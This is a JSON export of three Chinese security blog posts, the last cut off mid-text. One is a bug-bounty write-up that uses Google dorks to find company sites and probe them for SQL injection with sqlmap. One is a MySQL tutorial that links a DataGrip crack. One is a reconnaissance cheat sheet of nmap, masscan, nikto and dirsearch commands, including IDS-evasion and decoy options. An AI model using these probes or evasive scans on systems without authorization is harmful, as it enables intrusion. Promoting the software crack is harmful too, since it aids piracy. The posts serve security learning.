[{"id":"383a8d5ba196b4646bb1483f4bbab66a","title":"记一次Google hacking加sqlmap的src漏洞挖掘","content":"信息收集这次的目标是挖sql注入，所以可以直接Google语法指定一下目标inurl:asp?id=21 公司\n这里解释一下，asp的目的当然是为了更好的上分（php的目标太多人挖了），公司的目的是指定到国内的网站\n然后就是安搜索出的结果一个一个的测试\n\n某科技实业有限公司堆叠注入漏洞目标页面\n\n先加一个单引号试试会不会报错\n?id=21&#39;\n\n报错了，说明字符被带入数据库查询了，感觉有戏\n后续又测试了\n?id&#x3D;21 and 1&#x3D;1\n?id&#x3D;21 and 1&#x3D;2\n?id&#x3D;21&#39; and 1&#x3D;1\n\n都有报错，敏感字符没被过滤，大概就是有漏洞了，丢到sqlmap里泡一泡\n测试结果是有一个堆叠注入\n\n爆出库名后点到为止，到漏洞盒子上去提交了\n\n某物流公司布尔盲注正常页面\n\n还是先传一个单引号试试\n?id=21&#39;\n页面异常\n\n传个and 1&#x3D;1试试\n?id=21 and 1=1\n界面恢复正常\n\n至此可以基本确定有sql注入了\n再用and 1&#x3D;2测试一次\n?id=21 and 1=2\n\n异常，不用犹豫，直接sqlmap一把嗦\n\n存在布尔盲注\n点到为止，爆出库名去提交了\n\n","slug":"第一次src挖掘-Googlehacking+sqlmap","date":"2023-04-13T11:25:48.710Z","categories_index":"漏洞挖掘","tags_index":"src","author_index":"Abyssaler"},{"id":"7974e7ccefe4905fc9fb3ebb6fd8ac8a","title":"MySQL数据库学习-基础篇","content":"MySQL概述数据库(Database，DB)是按照数据结构来组织、存储和管理数据的仓库，其本身可被看作电子化的文件柜，用户可以对文件中的数据进行增删改查等操作。\n数据库系统是指在计算机系统中引入数据库后的系统，除了数据库，还包括数据库管理系统(Database Management System，DBMS)、数据库应用程序。\n\n\n数据库：\n数据存储的仓库\n数据库管理系统：\n操纵和管理数据库的大型软件\nSQL：\n操作关系型数据库的编程语言，是一套标准\nMySQL安装下载地址\nhttps://dev.mysql.com/downloads/installer/\n安装步骤双击安装包等待准备完成\n进入如下页面\n\n直接点击下一步\n\n\n等待安装完成后一直下一步\n\n接着点击下一步\n\n设置root账号的密码，这里因为是在我自己电脑所以我的密码是123456\n\n然后就一路下一步就行\n启动与停止第一种\n直接在WIN+R输入service.msc\n在这里进行启动停止\n\n第二种\n管理员启动cmd命令行中输入\n启动:net start mysql80\n停止:net stop mysql80\n客户端连接方式一\n方式二\n注意:使用这种方式需要配置PATH环境变量\n配置环境变量我的电脑-&gt;属性-&gt;高级系统设置-&gt;环境变量\n\n注意bin后面加个\n就可以在任意位置的cmd中使用MySQL了\n\n数据模型\n总结:通过表结构来存储数据的数据库,就叫关系型数据库,其他就是非关系型数据库\nSQL通用语法及分类通用语法\nsql的分类\nDDL库操作查询查询所有数据库\nshow databases;\n\n查询当前数据库\nselect database();\n\n创建create database [if not exists] 数据库名 [default charset 字符集] [collate 排序规则];\n\n比如\ncreate database test default charset utf8mb4;\n\n删除drop database [if exists] 数据库名;\n\n使用use 数据库名;\n\n表操作查询查询当前数据库所有表\nshow tables;\n\n查询表结构\ndesc 表名;\n\n\n查询指定表的建表语句\nshow create table 表名;\n\n\n创建create table 表名(\n\t字段1 字段1类型[COMMENT 字段1注释],\n    字段2 字段2类型[COMMENT 字段2注释],\n    字段3 字段3类型[COMMENT 字段3注释],\n    ...\n    字段n 字段n类型[COMMENT 字段n注释]\n)[comment 表注释];\n\n例如\ncreate table user(\n\tid int comment &#39;编号&#39;,\n    name varchar(50) comment &#39;姓名&#39;,\n    age int comment &#39;年龄&#39;,\n    sex varchar(1) comment &#39;性别&#39;\n) comment &#39;用户表&#39;;\n\n数据类型数值类型\n\nage tinyint unsigned #表示创建一个无符号范围的数值类型为tinyint的字段\n\n字符串类型 \n\n日期时间类型\n\n案例\n解答\ncreate table emp(\n\tid int comment &#39;编号&#39;,\n    workno varchar(10) comment &#39;员工工号&#39;,\n    name varchar(10) comment &#39;员工姓名&#39;,\n    gender char(1) comment &#39;性别&#39;,\n    age tinyint unsigned comment &#39;年龄&#39;,\n    idcard char(18) comment &#39;身份证号&#39;,\n    entrydate date comment &#39;入职时间&#39;\n) comment &#39;员工表&#39;;\n\n修改添加字段\nalter table 表名 add 字段名 类型(长度) [comment 注释] [约束];\n\n\nalter table emp add nickname varchar(20) comment &#39;昵称&#39;;\n\n修改数据类型\nalter table 表名 modify 字段名 新数据类型(长度)\n\n修改字段名和字段类型\nalter table 表名 change 旧字段名 新字段名 类型(长度) [comment 注释] [约束];\n\n\nalter table emp change nickname username varchar(30);\n\n删除字段\nalter table 表名 drop 字段名;\n\n\nalter table emp drop username;\n\n修改表名\nalter table 表名 rename to 新表名;\n\n\nalter table emp rename to employee;\n\n删除删除表\ndrop table [if exists] 表名;\n\n删除指定表,并重新创建该表\ntruncate table 表名;\n\n小结\nMySQL图形化界面\n这里用DataGrip\nDataGrip下载 地址\nhttps://www.jetbrains.com/zh-cn/datagrip/download/#section=windows\n\n然后一直下一步安装即可\n破解教程\nhttps://www.exception.site/essay/datagrip-2022-pojie\n补丁\n链接：https://pan.baidu.com/s/1M8rWDaL3BHtyXa3JlbQ02Q?pwd=0csc提取码：0csc \n激活成功后新建项目\n\n连接MySQL\n输入用户名密码后下载驱动\n\n成功后点击apply即可\n\n展示所有数据库\n\n成功\n\n新建数据库右键点击MySQL,新建一个schema(就是新建一个数据库的意思)\n\n\n新建表右键点击数据库,新建表\n\n然后自己添加数据即可\n修改表结构右键点击表,选择modify table\n\n然后自行修改即可\n\n操作想在哪个数据库或者哪张表操作直接右键点击,然后选择query console就可以在控制台操作了\n\n\nDML\n添加数据给指定字段添加数据\ninsert into 表名 (字段名1,字段名2,...) values (值1,值2...);\n\n给全部字段添加数据\ninsert into 表名 values (值1,值2,...);\n\n批量添加数据\ninsert into 表名 (字段名1,字段名2,...) values (值1,值2,...),(值1,值2,...),(值1,值2,...);\n\ninsert into 表名 values (值1,值2,...),(值1,值2,...),(值1,值2,...);\n\n注意\n\n插入数据时,指定的字段顺序要与值的顺序一一对应\n字符串和日期型数据应该包含在单引号中\n插入的数据大小,应该在字段的规定范围内\n\n修改数据修改字段中的数据\nupdate 表名 set 字段名1&#x3D;值1,字段名2&#x3D;值2,... [where 条件];\n\n注意:修改语句的条件可以有,也可以没有,如果没有条件,则会修改整张表的所有数据\n例子\nupdate emp set name&#x3D;&#39;xiao&#39; where id&#x3D;1;\nupdate emp set name&#x3D;&#39;小张&#39;,gender&#x3D;&#39;男&#39; where id&#x3D;1;\nupdate emp set entrydate&#x3D;&#39;2001-04-01&#39;; # 修改整张表的数据\n\n删除数据delete from 表名 [where 条件];\n\n注意\n\ndelete语句条件可以有,也可以没有,如没有条件,则删除整张表的所有数据\ndelete语句不能删除某一字段的值(可以使用update)\n\n小结\nDQL\n语法\n基本查询查询多个字段\nselect 字段1,字段2,字段3... from 表名;\n\nselect * from 表名;\n\n设置别名\nselect 字段1 [as 别名1],字段2 [as 别名2] ... from 表名;\n\n去除重复记录\nselect distinct 字段列表 from 表名;\n\n例如\n先建表\n\n\n# 查询指定字段name,workno,age返回\nselect name,workno,age from emp;\n# 查询所有字段并返回\nselect * from emp;\n# 查询所有员工的工作地址,起别名\nselect workaddress as &#39;工作地址&#39; from emp;\n# 查询所有员工上班地址(不要重复)\nselect distinct workaddress from emp;\n\n条件查询语法\nselect 字段列表 from 表名 where 条件列表;\n\n条件\n\n例子\n\n\n\n\n\n聚合函数针对的是表中的某一列的\n\n语法\nselect 聚合函数(字段列表) from 表名;\n\n注意:null值不参与所有聚合函数运算\n例子\n\n\n\n分组查询select 字段列表 from 表名 [where 条件] group by 分组字段名 [having 分组后过滤条件];\n\n\n例子\n\n\n注意\n\n执行顺序:where&gt;聚合函数&gt;having\n分组之后,查询的字段一般为聚合函数和分组字段,查询其他字段无任何意义\n\n排序查询语法\nselect 字段列表 from 表名 order by 字段1 排序方式1,字段2 排序方式2;\n\n排序方式\n\nasc：升序(默认)\ndesc：降序\n\n注意：如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序\n分页查询语法\nselect 字段列表 from 表名 limit 起始索引，查询记录数；\n\n\nps：方言指的是数据库与数据库之间不同的规则\n例子\n\n练习\n\n执行顺序\nDCL\nDCL控制的对象主要包括两个方面：\n\n主要控制数据库有哪些用户可以访问\n用户具有什么样的访问权限\n\n用户管理\n在MySQL中，我们要管理一个用户，需要Host和User同时来定位\n查询用户\nuse mysql;\nselect * from user;\n\n创建用户\ncreate user &#39;用户名&#39;@&#39;主机名&#39; identified by &#39;密码&#39;;\n\n修改用户密码\nalter user &#39;用户名&#39;@&#39;主机名&#39; identified with mysql_native_password by &#39;新密码&#39;;\n\n删除用户\ndrop user &#39;用户名&#39;@&#39;主机名&#39;;\n\n例子\n\n权限控制常用权限如下\n\n查询权限\nshow grants for &#39;用户名&#39;@&#39;主机名&#39;;\n\n授予权限\ngrant 权限列表 on 数据库名.表名 to &#39;用户名&#39;@&#39;主机名&#39;;\n\n撤销权限\nrevoke 权限列表 on 数据库名.表名 from &#39;用户名&#39;@&#39;主机名&#39;;\n\n例子\n\n小结\n","slug":"MySQL数据库基础篇","date":"2023-03-24T03:42:20.362Z","categories_index":"学习笔记","tags_index":"数据库安全","author_index":"Abyssaler"},{"id":"8926bf7f2d1f8630ce6b123f3513e9c4","title":"渗透测试流程总结","content":"渗透测试流程心得总结因为渗透测试过程非常复杂且涉及到的知识点极多，为了防止自己遗忘同时方便快速查阅，将渗透测试全流程以及其中涉及到的各种知识总结下来\n1.确定目标确定你要渗透的目标，这里的前提是我们得经过用户的授权，才可以对网站进行渗透。不然如果我们没有经过客户的授权而对一个网站进行渗透测试的话，这是违法的！\n渗透测试分为 白盒测试 和 黑盒测试\n\n白盒测试就是在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码分析\n黑盒测试就是只告诉我们这个网站的url，其他什么都不告诉，然后让你去渗透，模拟黑客对网站的渗透\n\n2.信息收集（灵魂！！！）信息收集这一步及其重要，可以说信息收集的好坏直接影响了后续渗透的难易程度以及最终的结果\n有一句话说的很好,信息收集是渗透测的灵魂\n网站信息收集发现活动主机arp-scanarp-scan是Kali Linux自带的一款ARP扫描工具。该工具可以进行单一目标扫描，也可以进行批量扫描。批量扫描的时候，用户可以通过CIDR地址范围或者列表文件的方式指定。该工具允许用户定制ARP包，构建非标准数据包。同时，该工具会自动解析Mac地址，给出MAC对应的硬件厂商，帮助用户确认目标。\n使用方式：arp-scan option [rhost]\n常用指令：\n-f 从指定文件中读取主机名或地址：arp-scan -f IP.txt\n-l从网络接口配置生成地址 arp-scan -l\n-i 各扫描之间的时间差 ：arp-scan -l -i 1000\n-r 每个主机扫描次数 : arp-scan -r 5\n-V显示程序版本并退出\n-t 设置主机超时时间 : arp-scan -t 1000 10.10.10.0&#x2F;24\n-I使用网络接口 : arp-scan -I eth0\n-g不显示重复的数据\n-D显示数据包往返时间\n\n命令arp-scan -l\n\nnmap系统漏洞扫描之王-nmap\nNMap，也就是Network Mapper，是Linux下的网络扫描和嗅探工具包。\n常用命令:\nnmap -sP -v 192.168.1.0&#x2F;24 &#x2F;&#x2F; 对本地网络进行扫描并列出详细信息\nnmap -sP 192.168.123.1&#x2F;24 &#x2F;&#x2F;Ping扫描\nnmap -p0 192.168.123.1&#x2F;24 &#x2F;&#x2F;无ping扫描,可避免防火墙的发现\nnmap -PS 192.168.123.1&#x2F;24 &#x2F;&#x2F;TCP Syn Ping即传输层的TCP&#x2F;IP扫描，通过发送和接收报文的形式进行扫描，在这种情况下每个端口都会轻易的被发现。\nnmap -PA 192.168.123.1&#x2F;24 &#x2F;&#x2F;很多防火墙会封锁SYN报文，所以nmap提供了SYN和ACK两种扫描方式，这两者的结合大大的提高了逃避防火墙的概率。\n#在实际中我们通常将ps和pa两个参数放到一起，这样效果会更好。\nnmap -PU 192.168.123.1&#x2F;24 &#x2F;&#x2F;使用UDP扫描，nmap会发送一个空的报文到主机，如果返回则说明设备在线\nnmap -PR 192.168.123.1&#x2F;24 &#x2F;&#x2F;ARP扫描是nmap对目标进行一个apr ping扫描的过程，尤其在内网的情况下。因为在本地局域网防火墙是不会禁止ARP请求的。所以在内网中使用apr扫描时非常有效的。\nnmap -sL 192.168.123.1&#x2F;24 &#x2F;&#x2F;列表扫描，他仅仅是列出制定网络上的每台主机，不发送任何报文给目标,但会列出一些无用的信息\n\n\n命令nmap -sn 192.168.1.0/24\n\nnetdiscovernetdiscover是一种用于收集有关网络的所有重要信息的工具。 它收集有关已连接客户端和路由器的信息。 对于连接的客户端，我们将能够知道他们的IP，MAC地址和操作系统，以及他们在其设备中打开的端口。 至于路由器，它将帮助我们了解路由器的制造商。 然后，如果我们试图破解它们，我们将能够查找可以用于客户端或路由器的漏洞。\nnetdiscover -i eth0 -r 192.168.2.0&#x2F;24   \n&#x2F;&#x2F;IP地址是192.168.2.0网段，子网掩码是255.255.255.0，3个255的掩码位是24(需要网络知识基础),使用netdiscover工具对该网段进行局域网存活主机探测\n\nnetdiscover -p\n被动模式:被动模式的方法更加隐蔽,但是速度会比较慢,网卡被设置为混杂模式来侦听网络内的arp数据包进行被动式探测,这种方式就需要网络内设备发送arp包才能被探测到。\n\n命令netdiscover -i eth0 -r 192.168.1.0/24\n\n都可以达到目的\n端口探测masscanmasscan是为了尽可能快地扫描整个互联网而创建的，根据其作者robert graham，这可以在不到6分钟内完成，每秒大约1000万个数据包。\nmasscan不建立完整的TCP连接，收到SYN&#x2F;ACK之后，发送RST结束连接。选项–banners除外。\nmasscan &lt;IP地址/范围&gt; -p端口选项 \n常用命令\nmasscan --rate&#x3D;10000 -p 1-65535 192.168.1.132 &#x2F;&#x2F;以10000的速率对192.168.1.132的所有端口扫描\nmasscan -p80,8080-8100 10.0.0.0&#x2F;8 &#x2F;&#x2F;扫描指定网段的80和8080-8100之间的端口\nmasscan 10.0.0.0&#x2F;8 -p80 --banners --source-ip x.x.x.x &#x2F;&#x2F;完成TCP连接的同时获取目标应用程序的Banner信息\nmasscan 222.182.111.1&#x2F;24 -p80 &#x2F;&#x2F;扫描某一个端口\nmasscan 222.182.111.1&#x2F;24 -p80,81,8080 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p22-25 &#x2F;&#x2F;扫描多个端口\nmasscan 222.182.111.1&#x2F;24 -p80 --rate 100000 &#x2F;&#x2F;指定扫描速度(每秒扫描100000个数据包)\nmasscan 222.182.111.1&#x2F;24 -p80 --excludefile &#x2F;root&#x2F;target.txt  &#x2F;&#x2F;指定不扫描某文件内的ip\nmasscan 222.182.111.1&#x2F;24 -p80 &gt; &#x2F;root&#x2F;results.txt  &#x2F;&#x2F;指定扫描结果保存在某一文件\nmasscan 222.182.111.1&#x2F;24 -p0-65535 --rate 100000 &#x2F;&#x2F;扫描所有端口\n\nIP地址范围，有三种有效格式：\n1、单独的IPv4地址\n2、类似&quot;10.0.0.1-10.0.0.233&quot;的范围地址\n3、CIDR地址类似于&quot;0.0.0.0&#x2F;0&quot;，多个目标可以用逗号隔开\n\n-p &lt;ports,–ports &gt; 指定端口进行扫描\n–banners 获取banner信息，支持少量的协议\n–rate 指定发包的速率\n-c , --conf 读取配置文件进行扫描\n–echo将当前的配置重定向到一个配置文件中\n-e , --adapter 指定用来发包的网卡接口名称\n–adapter-ip 指定发包的IP地址\n–adapter-port 指定发包的源端口\n–adapter-mac 指定发包的源MAC地址\n–router-mac 指定网关的MAC地址\n–exclude &lt;ip&#x2F;range&gt;IP地址范围黑名单，防止masscan扫描\n–excludefile 指定IP地址范围黑名单文件\n–includefile，-iL 读取一个范围列表进行扫描\n–ping扫描应该包含ICMP回应请求\n–append-output 以附加的形式输出到文件\n–iflist 列出可用的网络接口，然后退出–retries 发送重试的次数，以1秒为间隔\n–nmap打印与nmap兼容的相关信息\n–http-user-agent 设置user-agent字段的值\n–show[open,close] 告诉要显示的端口状态，默认是显示开放端口\n–noshow [open,close] 禁用端口状态显示\n–pcap 将接收到的数据包以libpcap格式存储\n–regress 运行回归测试，测试扫描器是否正常运行\n–ttl 指定传出数据包的TTL值，默认为255\n–wait 指定发送完包之后的等待时间，默认为10秒\n–offline 没有实际的发包，主要用来测试开销\n-sL 不执行扫描，主要是生成一个随机地址列表\n–readscan 读取从-oB生成的二进制文件，可以转化为XML或者JSON格式\n–connection-timeout 抓取banners时指定保持TCP连接的最大秒数，默认是30秒。\n\n\nnmapNmap（Network Mapper，网络映射器）是一款开放源代码的网络探测和安全审核工具，俗称扫描器之王。它的设计目标是快速地扫描大型网络，当然用它扫描单个主机也没有问题。Nmap以新颖的方式使用原始IP报文来发现网络上有哪些主机，那些主机提供什么服务（应用程序名和版本），那些服务运行在什么操作系统（包括版本信息），它们使用什么类型的报文过滤器&#x2F;防火墙，以及一堆其它功能。虽然Nmap通常用于安全审核， 许多系统管理员和网络管理员也用它来做一些日常的工作，比如查看整个网络的信息，管理服务升级计划，以及监视主机和服务的运行。\n命令大全:\nnmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢\nnmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快\nnmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描\nnmap -sU 192.168.96.4  &#x2F;&#x2F;UDP扫描,慢,可得到有价值的服务器程序\nnmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包\nnmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽\nnmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描\nnmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描\nnmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml\nnmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。\nnmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描\nnmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描\nnmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长\nnmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长\nnmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描\nnap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出\nnmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数\nnmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测\nnmap --source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口\nnmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。\nnmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)\nnmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）\nnmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。\nnmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要\nnmap --system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器\nnmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。\nnmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。\nnmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。\nnmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。\n\n常用:\nnmap –sS -p 端口号 -v IP &#x2F;&#x2F;扫描指定IP开放端口\nnmap IP -v -p 1-65535 &#x2F;&#x2F;指定端口号1-65535，显示扫描过程\nnmap IP -p 53,161 &#x2F;&#x2F;只扫描53，161端口\nnmap –Pn&#x2F;P0 -A IP &#x2F;&#x2F;穿透防火墙扫描\nnmap -F IP -v &#x2F;&#x2F;快速扫描\nnmap --script&#x3D;vuln IP &#x2F;&#x2F;使用vuln脚本进行常见的漏洞扫描\nnmap -sV -v IP &#x2F;&#x2F;指纹识别扫描，扫描系统和程序版本号检测，并且输出详细信息\nnmap -sL -R IP&#x2F;24 -v &#x2F;&#x2F;扫描整个C段，反向域名解析\nnmap -p 80,443,445 -sV -A ip &#x2F;&#x2F;对指定端口进行精细扫描\nnmap -sV -T4 -O -p 80,22 192.168.15.152 &#x2F;&#x2F;常用端口扫描,版本探测和操作系统识别\n\n\n指纹识别whatwebwhatweb 是kali中网站指纹识别的工具，使用Ruby语言开发。whatweb可识别web技术，包括内容管理系统(CMS)、博客平台、统计&#x2F;分析包、JavaScript库，Web服务器和嵌入式设备等。它有超过900个插件，每个插件都能识别不同的东西。Whatweb还可以识别版本号，电子邮件地址、账户ID、Web框架模块，SQL错误等。\nWhatWeb可以隐秘、快速、彻底或缓慢扫描。WhatWeb支持攻击级别来控制速度和可靠性之间的权衡。当在浏览器中访问网站时，该交易包含许多关于Web技术为该网站提供支持的提示。有时，单个网页访问包含足够的信息来识别网站，但如果没有，WhatWeb可以进一步询问网站。默认的攻击级别称为“被动”，速度最快，只需要一个网站的HTTP请求。这适用于扫描公共网站。在渗透测试中开发了更积极的模式。\n用法： weatweb 域名\n\n-i 指定要扫描的文件\n-v 详细显示扫描的结果\n-a 指定运行级别\n\n常用指令:\nwhatweb 网址 &#x2F;&#x2F;单个目标\nwhatweb -v 192.168.1.100 &#x2F;&#x2F;详细输出\nwhatweb -input-file&#x3D;路径 or whatweb -i 路径 &#x2F;&#x2F;从外部导入目标数据进行批量探测\nwhatweb -a 等级 域名 （可以和-v参数结合使用)\nwhatweb --no-errors -t 255 内网网段 （可以和-a和-v参数结合使用) &#x2F;&#x2F;快速本地扫描（扫描内网主机）\nwhatweb http:&#x2F;&#x2F;www.baidu.com --log-xml&#x3D;baidu.xml &#x2F;&#x2F;将扫描结果导出至文件内\nwhatweb -l &#x2F;&#x2F;列出所有插件\n\n\n参数说明:\n-i : 指定要扫描的文件\n-v : 详细显示扫描的结果\n-a : 指定运行级别（1-4）\n\tstealthy 每个目标发送一次http请求，并且会跟随重定向\n\tunused 不可用（从2011年开始，此参数就是在开发状态\n\taggressive 每个目标发送少量的http请求，这些请求时根据参数为1时结果\t 确定的\n\theavy 每个目标会发送大量的http请求，会去尝试每一个插件\n–log-brief&#x3D;FILE 简要的记录，每个网站只记录一条返回信息\n–log-verbose&#x3D;FILE 详细输出\n–log-xml&#x3D;FILE 返回XML格式的日志\n–log-json&#x3D;FILE 以 json 格式记录日志\n–log-json-verbose&#x3D;FILE 记录详细的json日志\n–log-magictree&#x3D;FILE XML的树形结构\n\n\n目录扫描dirbdirb是一个基于字典的web目录扫描工具，会用递归的方式来获取更多的目录，它还支持代理和http认证限制访问的网站\n\n\n\n\n\n\n\n\n\n一些参考文章\nhttps://blog.csdn.net/weixin_44912169/article/details/105655195\nhttps://blog.csdn.net/liver100day/article/details/121394188\n对目标进行基本的扫描\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F;  #192.168.186.131为目标IP地址\n\n\n列举具有特定扩展名列表的目录\n在很多情况下，我们需要在目标服务器上提取特定扩展名的目录，然后可以使用dirb扫描的-X参数。此参数接受文件扩展名，然后在目标服务器或计算机上搜索给定的扩展名文件。\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -X .php #192.168.186.131为目标IP地址，.php为我们需要搜索的指定扩展名文件\n\n将输出保存到磁盘\ndirb http:&#x2F;&#x2F;192.168.186.131&#x2F; -o output.txt #192.168.186.131为目标IP地址， output.txt为将输出保存的文件名\n\n使用&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt 字典来扫描Web服务\ndirb http:&#x2F;&#x2F;192.168.1.116 &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;big.txt \n\n\n\nnikto基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。\nNikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等。\n\n\n\n\n\n\n\n\n\n官方网站\nhttps://cirt.net/Nikto2\nGithub源码\nhttps://github.com/sullo/nikto\n英文文档\nhttps://cirt.net/nikto2-docs/\n普通扫描\n对目标进行扫描，参数是 host，host 后可跟 ip 地址，也可跟域名 url 的形式\nnikto -h baidu.com\nnikto -host http:&#x2F;&#x2F;172.168.1.105\n\n扫描https网站\nnikto默认扫描会目标80端口，http协议，我们可以控制参数使得nikto对目标https协议，443端口进行扫描，并检查 ssl 一些常见的问题\nnikto -host www.baidu.com -port 443 -ssl\nnikto -host http:&#x2F;&#x2F;172.168.1.105 -ssl -port 443\n\n指定目录进行扫描\n有时候我们只需要扫描网站下的某个子目录，使用-c 参数指定扫描的目录，使用-c all 可进行目录爆破，并扫描\nnikto -host http:&#x2F;&#x2F;192.168.1.7 -c &#x2F;dvwa\n\n多目标扫描\nnikto支持多个目标进行扫描，将多个地址写入到文本中，通过- host参数+文本的方式即可统一进行扫描\nnikto -host list.txt\n\n其他功能\n以输出html文件格式输出扫描结果，具体命令如下：\nnikto -host http:&#x2F;&#x2F;www.example.com -o result.html -F html\n\n\nIDS 躲避\nnikto 在扫描过程中也可以使用它自带的 ids 躲避规则，参数是 - evasion，nikto 提供了八种躲避规则，通过 man 手册可查看详细信息\n\n\n\n1\n随机的 url 编码\n\n\n\n2\n只选择路径\n\n\n3\n提前结束 url\n\n\n4\n优先考虑长随机字符串\n\n\n5\n参数欺骗\n\n\n6\n使用 tab 作为命令分隔符\n\n\n7\n使用变化的 url\n\n\n8\n使用 windows 路径分隔符。\n\n\n使用方法直接 evasion 后跟序号即可\n使用 ids 躲避规则的123456 条对百度进行了扫描\nnikto -host https://www.baidu.com -ssl -port 443 -evasion 123456\n使用代理扫描\n扫描目标时，部分目标部署了防护设备，为避免暴露 ip可以使用代理进行扫描，nikto 支持设置代理，参数是 - useproxy。在使用时需要配合其他代理工具（比如proxychains）使用\nnikto -h https:&#x2F;&#x2F;www.baidu.com -useproxy http:&#x2F;&#x2F;127.0.0.1:1080\n\n\n\nnmapnmap加载脚本引擎扫描目录\nnmap --script=http-enum ip/url\ndirbuster目录暴力破解,图形化工具\ndirbuster\n\n\ndirbuster字典位置/usr/share/wordlists/dirbuster\ndirsearchdirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。相比其他扫描工具disearch的特点是：\n\n支持HTTP代理\n多线程\n支持多种形式的网页（asp,php）\n生成报告（纯文本，JSON）\n启发式检测无效的网页\n递归扫描用户代理随机化\n批量处理\n扫描器与字典（注：字典必须是文本文件）\n\n常用指令:\n\n\n\n\n\n\n\n\n\ndirsearch的命令这篇文章写的非常详细\nhttps://blog.csdn.net/qq_43936524/article/details/115271837\ndirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e*\ndirsearch -u http:&#x2F;&#x2F;192.168.88.132:8848&#x2F; -e* -w  &#x2F;root&#x2F;dirsearch&#x2F;db&#x2F;dicc.txt &#x2F;&#x2F;指定字典\npython3 dirsearch.py -u http:&#x2F;&#x2F;192.168.52.143 -e * -i 200 --full-url --xml-report&#x3D;1.xml &#x2F;&#x2F;将检查结果以xml形式存放\ndirsearch -u http:&#x2F;&#x2F;699d672d-8e10-4003-a7b8-76a736f30c67.node.kanxue.com:81&#x2F;  -e * -x 500-599 过滤无用信息\n\n常用命令 \n--version            显示dirsearch的版本\n-h --help            帮助提示\n-u  --url            指定网址\n-e                   指定网站语言\n-w                   指定字典\n-r                   递归目录（跑出目录后，继续跑目录下面的目录）\n-l  --url-list&#x3D;FILE  目标url文件路径\n-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)\n-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)\n\n\n\n\n\n页面信息探测WappalyzerWappalyzer是一款功能强大的、且非常实用的chrome网站技术分析插件，通过该插件能够分析目标网站所采用的平台构架、\n网站环境、服务器配置环境、JavaScript框架、编程语言等参数，使用时很简单，开启你要分析、检测的网页后，点选该图示即可看到网站使用的相关技术和服务\n\ncewlCewl是一款采用Ruby开发的应用程序，你可以给它的爬虫指定URL地址和爬取深度，还可以添额外的外部链接，接下来Cewl会给你返回一个字典文件，你可以把字典用到类似John the Ripper这样的密码破解工具中。除此之外，Cewl还提供了命令行工具。\n默认方法\n输入下列命令之后，爬虫会根据指定的URL和深度进行爬取，然后打印出可用于密码破解的字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F;\n\n\n\n保存字典文件\n为了方便大家记录，或者为将来的研究提供参考，Cewl可以将打印出的字典存储为文件。这里可以使用-w参数来将密码字典存储为text文件：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -w dict.txt\n\n我们可以使用下列命令查看密码字典是否存储成功，我们的存储路径为&#x2F;root &#x2F;dict.txt：\ncat dict.txt\n\n\n\n生成特定长度的字典\n如果你想生成指定长度的密码字典，你可以使用-m选项来设置：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -m 9\n\n上述命令将生成长度至少为9位的密码，，Cewl对目标网站进行了爬取，并打印出了长度至少为9位的密码\n从网站中获取Email\n你可以使用-e选项来启用Email参数，并配合-n选项来隐藏工具在爬取网站过程中生成的密码字典：\ncewl http:&#x2F;&#x2F;www.ignitetechnologies.in&#x2F; -n 